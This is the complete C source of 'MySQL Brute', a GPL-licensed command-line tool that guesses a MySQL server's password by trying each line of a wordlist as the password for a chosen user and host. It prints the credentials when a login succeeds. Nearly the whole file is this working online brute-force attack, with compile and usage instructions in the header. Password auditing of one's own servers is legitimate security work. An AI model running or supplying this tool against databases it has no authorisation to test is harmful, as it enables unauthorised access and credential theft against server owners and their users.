
/**
	* MySQL Brute
	*
	* mysqld bruteforcer using word lists.
	*
	* @author        Martin Latter
	* @copyright     Martin Latter, 27/05/2017
	* @version       0.10
	* @license       GNU GPL version 3.0 (GPL v3); https://www.gnu.org/licenses/gpl-3.0.html
	* @link          https://github.com/Tinram/MySQL-Brute.git
	*
	* Compile:
	* (Linux GCC x64)
	*                 required dependency: libmysqlclient-dev
	*                 gcc mysqlbrute.c $(mysql_config --cflags) $(mysql_config --libs) -o mysqlbrute -Ofast -Wall -Wextra -Wuninitialized -Wunused -Werror -std=gnu99 -s
	*
	* Usage:
	*                 ./mysqlbrute --help
	*                 ./mysqlbrute -h <host> -u <username> -f <wordlist_file>
	*
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <getopt.h>
#include <mysql.h>


#define MB_VERSION "0.10"
#define MAX_WORD_LEN 50


void menu(char* pProgname);
unsigned int options(int iArgCount, char* aArgV[]);


char* pHost = NULL;
char* pUser = NULL;
char* pFilename = NULL;
char* pProgname = NULL;
unsigned int iPort = 3306;


int main(int iArgCount, char* aArgV[]) {

	unsigned int iMenu = options(iArgCount, aArgV);

	if ( ! iMenu) {
		return EXIT_FAILURE;
	}

	pProgname = aArgV[0];

	MYSQL* pConn;
	FILE* pWordlist;
	clock_t tStart;
	clock_t tDiff;
	int iMSec;
	unsigned int iPasswordFound = 0;
	unsigned int iWordCount = 0;
	char sBuffer[MAX_WORD_LEN];
	char sPassword[MAX_WORD_LEN];

	pConn = mysql_init(NULL);

	if (pConn == NULL) {

		fprintf(stderr, "\nCannot initialise MySQL connector.\n\n");
		return EXIT_FAILURE;
	}

	tStart = clock();

	pWordlist = fopen(pFilename, "r");

	if (pWordlist == NULL) {

		fprintf(stderr, "\nError in trying to read wordlist file.\n\n");
		return EXIT_FAILURE;
	}

	while (fgets(sBuffer, MAX_WORD_LEN, pWordlist) != NULL) {

		iWordCount++;

		size_t iIdx = strcspn(sBuffer, "\r\n"); /* strip EOL, thanks Tim Čas */
		strncpy(sPassword, sBuffer, iIdx);
		sPassword[iIdx] = '\0';

		/* attempt to connect to mysqld and match the parameters passed */
		if (mysql_real_connect(pConn, pHost, pUser, sPassword, NULL, iPort, NULL, 0) != NULL) {

			iPasswordFound = 1;
			fprintf(stdout, "\n\nSuccess!\nusername: %s\npassword: %s\n", pUser, sPassword);
			break;
		}

		if (iWordCount % 1000 == 0) {

			fprintf(stdout, "line: %u\r", iWordCount);
			fflush(stdout);
		}

	}

	/* close file */
	fclose(pWordlist);

	/* close connection */
	mysql_close(pConn);

	if ( ! iPasswordFound) {
		fprintf(stdout, "\n\nNo password match.\n");
	}

	fprintf(stdout, "\nwords parsed: %u\n", iWordCount);

	/* timer end */
	tDiff = clock() - tStart;

	/* timer display, by Ben Alpert */
	iMSec = tDiff * 1000 / CLOCKS_PER_SEC;
	fprintf(stdout, "parse time: %d s %d ms\n\n", iMSec / 1000, iMSec % 1000);

	return EXIT_SUCCESS;
}


/**
	* Process command-line switches using getopt()
	*
	* @param   int iArgCount, number of arguments
	* @param   array aArgV, switches
	* @return  unsigned integer
*/

unsigned int options(int iArgCount, char* aArgV[]) {

	int iOpts = 0;
	int iOptsIdx = 0;
	unsigned int iHelp = 0;
	unsigned int iVersion = 0;

	struct option aLongOpts[] = {
		{"help", no_argument, 0, 'i'},
		{"version", no_argument, 0, 'v'},
		{0, 0, 0, 0}
	};

	while ((iOpts = getopt_long(iArgCount, aArgV, "ivh:w:u:f:p:", aLongOpts, &iOptsIdx)) != -1) {

		switch (iOpts) {

			case 'i':
				iHelp = 1;
				break;

			case 'v':
				iVersion = 1;
				break;

			case 'h':
				pHost = optarg;
				break;

			case 'u':
				pUser = optarg;
				break;

			case 'f':
				pFilename = optarg;
				break;

			case 'p':
				iPort = (unsigned int) atoi(optarg);
				break;

			case '?':

				if (optopt == 'h' || optopt == 'w' || optopt == 'u' || optopt == 'f' || optopt == 'p') {
					fprintf(stderr, "\nMissing switch arguments.\n\n");
				}
				else if (optopt == 0) {
					break;
				}
				else {
					fprintf(stderr, "\nUnknown option `-%c'.\n\n", optopt);
				}

				return 0;
				break;

			default:
				return 0;
		}
	}

	if (iHelp == 1) {

		menu(aArgV[0]);
		return 0;
	}
	else if (iVersion == 1) {

		fprintf(stdout, "\nMySQL Brute v.%s\n\n", MB_VERSION);
		return 0;
	}
	else if (pHost == NULL || pFilename == NULL || pUser == NULL) {

		fprintf(stderr, "\nMySQL Brute: use '%s --help' for help\n\n", aArgV[0]);
		return 0;
	}
	else {
		return 1;
	}
}


/**
	* Display menu.
	*
	* @param   char* pProgname, filename from aArgV[0]
	* @return  void
*/

void menu(char* pProgname) {

	fprintf(stdout, "\nMySQL Brute v.%s\nby Tinram", MB_VERSION);
	fprintf(stdout, "\n\nUsage:\n");
	fprintf(stdout, "\t%s -h <host> -u <user> -f <file> [-p port]\n\n", pProgname);
}
